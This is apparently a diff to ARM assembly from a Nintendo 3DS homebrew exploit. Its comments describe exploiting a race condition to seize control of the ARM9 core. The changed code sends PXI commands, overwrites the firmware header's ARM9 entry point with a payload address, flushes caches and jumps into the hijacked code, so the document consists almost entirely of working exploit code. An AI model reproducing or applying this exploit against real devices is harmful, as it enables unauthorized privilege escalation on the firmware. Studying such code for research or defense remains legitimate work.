@@ -11,17 +11,17 @@ arm11_start:
 hook1:
 	STMFD           SP!, {R0-R12,LR}
 
-	MOV             R0, #1000
-	BL              busy_spin
+	MOV             R0, #64
+	BL              delay
 
 	MOV             R0, #0
-	BL              pxi_send	
-	
+	BL              pxi_send
+
 	BL              pxi_sync
-	
+
 	MOV             R0, #0x10000
 	BL              pxi_send
-	
+
 	BL              pxi_recv
 	BL              pxi_recv
 	BL              pxi_recv
@@ -29,14 +29,8 @@ hook1:
 	MOV             R0, #2
 	BL              pdn_send
 
-	MOV             R0, #16
-	BL              busy_spin
-
 	MOV             R0, #0
 	BL              pdn_send
-
-	MOV             R0, #16
-	BL              busy_spin
 
 	LDMFD           SP!, {R0-R12,LR}
 
@@ -53,23 +47,27 @@ hook2:
 	LDR             R2, pa_hijack_arm9_dst
 	MOV             R4, R2
 	BL              copy_mem
+	MOV		r0, #0
+	MCR		p15, 0, r0, c7, c10, 0	@ Clean data cache
+	MCR		p15, 0, r0, c7, c10, 4	@ Drain write buffer
+	MCR		p15, 0, r0, c7, c5, 0	@ Flush instruction cache
 	BX              R4
 
 @ exploits a race condition in order
 @ to take control over the arm9 core
 hijack_arm9:
 	@ init
-	LDR             R0, pa_arm11_code 
-	MOV             R1, #0 
+	LDR             R0, pa_arm11_code
+	MOV             R1, #0
 	STR             R1, [R0]
-	
+
 	@ load physical addresses
 	LDR             R10, pa_firm_header
 	LDR             R9, pa_arm9_payload
 	LDR             R8, pa_io_mem
-	
+
 	@ send pxi cmd 0x44846
-	LDR             R1, pa_pxi_regs 
+	LDR             R1, pa_pxi_regs
 	LDR             R2, some_pxi_cmd
 	STR             R2, [R1, #8]
 
@@ -77,26 +75,20 @@ wait_arm9_loop:
 	LDRB            R0, [R8]
 	ANDS            R0, R0, #1
 	BNE	            wait_arm9_loop
-	
-	@ get arm9 orig entry point phys addr from FIRM header
-	LDR             R0, [R10, #0x0C]
-
-	@ backup orig entry point to FCRAM + offs ARM9 payload + 4
-	STR             R0, [R9, #0x4]
 
 	@ overwrite orig entry point with FCRAM addr
 	@ this exploits the race condition bug
-	STR             R9, [R10, #0x0C] 	
+	STR             R9, [R10, #0x0C]
 
 	LDR             R0, pa_arm11_code
 wait_arm11_loop:
 	LDR	            R1, [r0]
-	CMP             R1, #0  
+	CMP             R1, #0
 	BEQ             wait_arm11_loop
 	BX              R1
 
 	pa_hijack_arm9_dst:  .long 0x1FFFFC00
-	pa_arm11_code:       .long 0x1FFFFFFC
+	pa_arm11_code:       .long 0x1FFFFFF8
 	pa_pxi_regs:         .long 0x10163000
 	some_pxi_cmd:        .long 0x44846
 	pa_firm_header:      .long 0x24000000
@@ -128,29 +120,32 @@ loc_FFFF0AA8:
 locret_FFFF0AC0:
 	BX              LR
 
-busy_spin:
-	SUBS            R0, R0, #2
-	NOP
-	BGT             busy_spin
-	BX              LR 
-
 pdn_send:
 	LDR             R1, va_pdn_regs
 	STRB            R0, [R1, #0x230]
 	BX              LR
-	
-pxi_send:  
+
+pxi_send:
 	LDR             R1, va_pxi_regs
 loc_1020D0:
 	LDRH            R2, [R1,#4]
 	TST             R2, #2
 	BNE             loc_1020D0
 	STR             R0, [R1,#8]
+
+	MOV             R0, #4
+delay:
+	MOV             R1, #0
+        MCR             p15, 0, r1, c7, c10, 0
+	MCR             p15, 0, r1, c7, c10, 4
+loop:
+	SUBS            R0, #1
+	BGT             loop
 	BX              LR
 
 pxi_recv:
 	LDR             R0, va_pxi_regs
-loc_1020FC:                              
+loc_1020FC:
 	LDRH            R1, [R0,#4]
 	TST             R1, #0x100
 	BNE             loc_1020FC
